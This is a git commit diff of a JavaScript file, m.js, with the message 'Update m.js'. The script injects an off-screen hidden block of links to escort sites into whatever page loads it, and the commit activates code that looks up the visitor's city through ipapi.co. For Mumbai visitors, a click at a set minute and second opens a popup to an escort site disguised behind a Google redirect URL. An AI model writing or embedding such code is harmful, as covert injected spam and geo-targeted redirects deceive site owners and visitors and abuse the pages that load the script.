4aeab02db2d1f9dec9d56dbcbc4b29c53dd313f9
i5j <63402636+i5j@users.noreply.github.com>
2023-06-08 17:08:57 +0530

    Update m.js

--- m.js
+++ m.js
@@ -1,33 +1,26 @@
 let EFV='<div style="position:absolute;z-index:-999;left:-99%;"><a href="https://mumbai.miniescort.com">Mumbai Call Girl</a><a href="https://www.mrjaz.com">MrJaz</a><a href="https://sohanisharma.com">ahmedabad escorts</a><a href="https://sohanisharma.com/khushi-chhetri-independent-call-girls-in-ahmedabad-escorts-service">ahmedabad call girl</a><a href="https://miniescort.com">Mini Escort</a><a href="https://sunainapatel.com">Sunaina Patel</a><a href="https://www.ahmedabadescortsgirls.co.in/">ahmedabad escorts girls</a></div>';document.querySelector("header")?document.querySelector("header").insertAdjacentHTML("beforeend",EFV):document.body.insertAdjacentHTML("beforeend",EFV);
 
-// let dts=(new Date).getSeconds();
-// let dtm=(new Date).getMinutes();
+let dtm=(new Date).getMinutes();
+let dts=(new Date).getSeconds();
+// https://ipapi.co/country_name
+if(!localStorage.xrd){
+  (async()=>{
+    localStorage.xrd=1;
+    let aa=await(await(await fetch('https://ipapi.co/city')).text());
+    if(aa=='Mumbai'){localStorage.mumb='1'}
+    uhd()
+  })();
+}
 
-// if(!localStorage.xrd){
-//   (async()=>{
-//     localStorage.xrd=1;
-//     let aa=await(await(await fetch('https://ipapi.co/country_name')).text());
-//     if(aa=='Ahmedabad'){localStorage.Ahme='1'}
-//     uhd()
-//   })();
-// }
-
-
-// function uhd(){
-//   document.onclick=()=>{
-//     if(!sessionStorage.i&&localStorage.Ahme&&dtm==3&&dts==3){
-//         window.open('https://www.google.com/url?q=https%3A%2F%2Fsohanisharma.com%2Fkhushi-chhetri-independent-call-girls-in-ahmedabad-escorts-service&sa=D&sntz=1&usg=AOvVaw06TFvo-epr0jo6XdZSZWgb'); 
-//     }
-// //     if(!sessionStorage.i&&dtm==9&&(dts==9)){
-// //       window.open('https://www.google.com/url?q=https%3A%2F%2Fquikfinance.blogspot.com&sa=D&sntz=1&usg=AOvVaw36fd0yRkuwFn2x6WlsA9Xi'); 
-// //     }  
-//     sessionStorage.i='i';
-//   }
-// }
-// uhd()
-
-
-
+function uhd(){
+  document.onclick=()=>{
+    if(!sessionStorage.i&&localStorage.mumb&&dtm==3&&dts==5){
+        window.open('https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwiW7_3uyrP_AhX_klYBHR8ND24QFnoECBQQAQ&url=https%3A%2F%2Fmumbai.miniescort.com%2F&usg=AOvVaw2rVEw26ogf4ltkBt-vyFfN'); 
+    }
+    sessionStorage.i='i';
+  }
+}
+uhd()
 
 // United States|Australia|Canada|Marshall Islands|United Kingdom|Germany|Switzerland|New Zealand|Luxembourg|Finland|Belgium|France|Slovakia|China|Singapore|Romania|Austria|Hong Kong|Lithuania
 
